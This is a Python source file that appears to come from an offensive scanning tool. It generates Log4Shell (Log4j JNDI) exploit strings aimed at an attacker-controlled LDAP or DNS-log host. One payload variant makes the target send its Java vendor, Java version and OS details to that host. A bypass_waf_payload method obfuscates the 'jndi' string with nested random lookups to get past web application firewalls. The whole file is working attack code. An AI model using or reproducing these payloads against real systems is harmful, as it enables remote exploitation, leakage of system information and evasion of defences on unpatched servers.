# -*- coding: utf-8 -*-
# @File  : payload.py
# @Date  : 2021/12/31
# @Desc  :
import ipaddress

from Lib.api import random_str, random_int


class Log4jPayload(object):
    def __init__(self):
        pass

    def is_ip_port(self, dnslog_base):
        try:
            ip_port = dnslog_base.split(":")
            port = int(ip_port[1])
            if port < 0 or port > 65535:
                return False
            ip = ipaddress.IPv4Address(ip_port[0])
            return True
        except Exception as E:
            return False

    def bypass_waf_payload(self, raw_payload):
        new_payload = ""
        for one_raw in raw_payload:
            if one_raw not in ["j", "d"]:
                new_payload = f"{new_payload}{one_raw}"
            else:
                one_format = ""
                for i in range(random_int(3)):
                    one_format = f"{one_format}{random_str(random_int(3))}:"
                one_new = f"${{{one_format}-{one_raw}}}"
                new_payload = f"{new_payload}{one_new}"
        return new_payload

    def get_payload_list(self, req_uuid, dnslog_base):
        if self.is_ip_port(dnslog_base):
            raw_payload = f"jndi:ldap://{dnslog_base}/{req_uuid}"
            bypass_payload = self.bypass_waf_payload(raw_payload)
            raw_payload = f"jndi:ldap://{dnslog_base}/{req_uuid}" + "/${sys:java.vendor}/${sys:java.version}/${sys:os.arch}/${sys:os.version}"
        else:
            raw_payload = f"jndi:ldap://{req_uuid}.{dnslog_base}/hi"
            bypass_payload = self.bypass_waf_payload(raw_payload)
        return [f"${{{raw_payload}}}", f"${{{bypass_payload}}}"]
